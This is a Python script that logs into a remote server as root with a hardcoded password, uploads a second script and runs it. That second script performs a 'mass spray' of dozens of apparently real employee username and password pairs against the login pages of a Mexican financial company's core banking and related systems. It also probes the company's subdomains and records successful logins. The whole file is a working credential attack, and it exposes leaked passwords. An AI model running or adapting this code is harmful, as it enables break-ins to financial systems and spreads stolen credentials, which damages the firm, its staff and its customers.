import paramiko, sys, time

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('64.177.88.10', username='root', password='5F.jyTK$D6%.F{a=', timeout=10)
print('Connected', flush=True)

SCRIPT = r"""
import requests, urllib3, json, sys, time, re
urllib3.disable_warnings()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.6834.111 Safari/537.36"
BASE = "https://core.findep.mx"

CREDS = [
    ("RVILLEGASE", "Mayo8080"),
    ("RVILLEGASE", "Mayo2020"),
    ("RVILLEGASE", "Mayo1919"),
    ("RVeLLsGoSs", "MAyO2020"),
    ("ilopezo", "Fisa1234*"),
    ("mvillalvag", "Dragon666*"),
    ("mvillalvag.mx", "Dragon666*"),
    ("omoctezumam", "Yec@0307"),
    ("omoctezumam", "Yec@9296"),
    ("jjaimesva", "Jesus291684="),
    ("jjaimesva", "Jesus182543="),
    ("jjaimesva", "Jesus171533="),
    ("jjaimesva", "Jesus071432="),
    ("jjaimesva", "Igual2020*"),
    ("cgarciamorenoc", "Cd10031854"),
    ("cgarciamorenoc", "Cd20042965"),
    ("jsilvade", "Ismael02*"),
    ("die75meng", "DevenTe"),
    ("MSEGOVIAM", "Finsol2019#"),
    ("lmiramontes", "Dipperm8$"),
    ("sguerreroch", "Capacita-1"),
    ("GALUNA", "Veracruz12"),
    ("ealdazaba", "Eugenio23"),
    ("eaviles", "vacaciones18"),
    ("tidesoftim26", "bord1@$"),
    ("SEDRF", "EDUCACION"),
    ("pprado", "pprado24"),
    ("jcruzval", "Fisa1234*"),
    ("aanzaldua", "Garcia123+"),
    ("jsangabriel", "EsPeRaNzA01*"),
    ("jmejiacan", "jos310383"),
    ("avegao", "Converse23?"),
    ("orosiles", "Fisa1234@"),
    ("adelatorret.mx", "Gerslp20*"),
    ("adelatorret", "Gerslp20*"),
    ("Esegovia89", "Esegovia89#"),
    ("dnoraaz04", "imss4654"),
    ("aperezpul", "1234"),
]

def try_core(user, pw):
    s = requests.Session()
    s.verify = False
    s.headers.update({"User-Agent": UA, "Referer": BASE + "/core/index.jsp"})
    r = s.get(BASE + "/core/index.jsp", timeout=10)
    act = re.search(r'action="([^"]+)"', r.text)
    action = act.group(1) if act else "/core/valida.do"
    r2 = s.post(BASE + action, data={
        "cve_idToken": "", "msjPass": "", "cveUsr": "",
        "cve_usr": user, "cve_psd": pw, "ok_btn": "Aceptar"
    }, timeout=10, allow_redirects=True)
    is_login = "cve_usr" in r2.text and "cve_psd" in r2.text
    has_error = "no son reconocidos" in r2.text
    return r2.status_code, len(r2.text), is_login, has_error, str(r2.url)

sys.stdout.write("=== CORE BANKING MASS SPRAY ===\n\n")
hits = []
for user, pw in CREDS:
    try:
        code, sz, is_login, has_error, url = try_core(user, pw)
        if not is_login:
            sys.stdout.write("*** HIT *** " + user + ":" + pw + " [" + str(code) + "] " + str(sz) + "b url=" + url[:80] + "\n")
            hits.append((user, pw))
        elif has_error:
            sys.stdout.write("  FAIL " + user + ":" + pw + "\n")
        else:
            sys.stdout.write("  ??? " + user + ":" + pw + " " + str(sz) + "b\n")
    except Exception as e:
        sys.stdout.write("  ERR " + user + ":" + pw + " " + str(e)[:40] + "\n")
    time.sleep(0.8)
    sys.stdout.flush()

sys.stdout.write("\nHITS: " + str(len(hits)) + "\n")
for h in hits:
    sys.stdout.write("  " + h[0] + ":" + h[1] + "\n")

# --- SIF spray ---
sys.stdout.write("\n=== SIF SPRAY ===\n\n")
SIF_CREDS = [
    ("szepedam", "Fisa321*"), ("lfelixc", "Fisa1234"), ("MCERVANTESCALL", "Breakbot.16"),
    ("px", "Breakbot.16"), ("px", "Fisa1234"), ("jcruzval", "Fisa1234"),
    ("ngonzalezroj", "Fisa2020"), ("lnietoma", "Fisa4105"), ("spugab", "Puga1234"),
    ("mcervantescall", "Breakbot.16"), ("3102748222", "alfa1978"),
]
for user, pw in SIF_CREDS:
    try:
        r = requests.post("https://sif.findep.mx/api/login",
            json={"username": user, "password": pw},
            headers={"User-Agent": UA}, verify=False, timeout=8)
        sys.stdout.write("  [" + str(r.status_code) + "] " + user + ":" + pw + " " + r.text[:100] + "\n")
    except Exception as e:
        sys.stdout.write("  ERR " + user + " " + str(e)[:40] + "\n")
    time.sleep(0.5)
    sys.stdout.flush()

# --- NEW SUBDOMAIN PROBE ---
sys.stdout.write("\n=== NEW SUBDOMAIN PROBE ===\n\n")
subs = [
    "https://mesa.findep.mx",
    "https://analytix.findep.mx",
    "https://rhcoa.findep.mx",
    "https://revista.findep.mx",
    "https://arranqueimparable.findep.mx",
    "https://movil.findep.mx",
    "http://movil.findep.mx",
    "https://awa.ah8.findep.mx",
    "https://awa.ah8.findep.mx/login",
    "http://35.192.238.30:8080/BuzonDigital/",
    "https://aheeva.findep.mx",
    "https://aheeva.findep.mx/login",
]
for url in subs:
    try:
        r = requests.get(url, headers={"User-Agent": UA}, verify=False, timeout=10, allow_redirects=False)
        title = ""
        tm = re.search(r'<title>(.*?)</title>', r.text, re.I | re.S)
        if tm:
            title = tm.group(1).strip()[:60]
        loc = r.headers.get("Location", "")[:60]
        sys.stdout.write("[" + str(r.status_code) + "] " + url + " (" + str(len(r.text)) + "b)")
        if title:
            sys.stdout.write(" title='" + title + "'")
        if loc:
            sys.stdout.write(" -> " + loc)
        sys.stdout.write("\n")
    except Exception as e:
        sys.stdout.write("[ERR] " + url + " " + str(e)[:50] + "\n")
    sys.stdout.flush()

# --- AHEEVA spray (top creds) ---
sys.stdout.write("\n=== AHEEVA SPRAY ===\n\n")
AH_CREDS = [
    ("aguzmango", "Ag727861820"), ("ezapatav", "Ez728411006"),
    ("aguzmango", "Fisa1234"), ("ovazquezp", "Chumel.25."),
    ("cmartinezgal", "Jazmin1805."), ("mcervantesar", "Fisa2022*"),
    ("mhuarachacall", "Mago2828/"), ("jfmorenocall", "123$%&789AWGTHc"),
    ("eavilama", "CobranzaAFI.12345"), ("CHUERTAMACALL", "1Napoleon25??"),
    ("llegaspi", "726525965"), ("vreyesmac", "Nissan2019*"),
    ("jperezpla", "727233756"), ("parellanoa", "Fisa1234"),
    ("acarrillori", "Fisa1234*"), ("icardonasicall", "Fisa2022*"),
]
for user, pw in AH_CREDS:
    try:
        r = requests.post("https://aheeva.findep.mx/login",
            data={"username": user, "password": pw},
            headers={"User-Agent": UA}, verify=False, timeout=8, allow_redirects=False)
        tag = str(r.status_code)
        if r.status_code == 302:
            loc = r.headers.get("Location", "")[:60]
            if "home" in loc or "calls" in loc or "dashboard" in loc:
                tag = "*** LOGIN OK ***"
            else:
                tag = "302->" + loc
        sys.stdout.write("  [" + tag + "] " + user + ":" + pw + "\n")
    except Exception as e:
        sys.stdout.write("  ERR " + user + " " + str(e)[:40] + "\n")
    time.sleep(0.5)
    sys.stdout.flush()

# --- AWA.AH8 spray ---
sys.stdout.write("\n=== AWA.AH8 SPRAY ===\n\n")
AWA_CREDS = [
    ("aguzmango", "Ag727861820"), ("ezapatav", "Ez728411006"),
    ("GUGA931224LGA", "Ajedrez1"),
]
for user, pw in AWA_CREDS:
    try:
        r = requests.post("https://awa.ah8.findep.mx/login",
            data={"username": user, "password": pw},
            headers={"User-Agent": UA}, verify=False, timeout=8, allow_redirects=False)
        tag = str(r.status_code)
        if r.status_code == 302:
            loc = r.headers.get("Location", "")[:60]
            tag = "302->" + loc
        sys.stdout.write("  [" + tag + "] " + user + ":" + pw + " " + r.text[:80] + "\n")
    except Exception as e:
        sys.stdout.write("  ERR " + user + " " + str(e)[:40] + "\n")
    time.sleep(0.5)
    sys.stdout.flush()

sys.stdout.write("\n=== DONE ===\n")
"""

sftp = ssh.open_sftp()
with sftp.open('/root/core_mass_spray.py', 'w') as f:
    f.write(SCRIPT)
sftp.close()
print('Uploaded', flush=True)

transport = ssh.get_transport()
channel = transport.open_session()
channel.exec_command('python3 -u /root/core_mass_spray.py 2>&1')
channel.settimeout(5)

start = time.time()
while time.time() - start < 180:
    try:
        if channel.recv_ready():
            chunk = channel.recv(8192).decode(errors='replace')
            sys.stdout.write(chunk)
            sys.stdout.flush()
        elif channel.exit_status_ready():
            while channel.recv_ready():
                chunk = channel.recv(8192).decode(errors='replace')
                sys.stdout.write(chunk)
                sys.stdout.flush()
            break
        else:
            time.sleep(0.3)
    except Exception:
        time.sleep(0.3)

print('\nFin.', flush=True)
ssh.close()
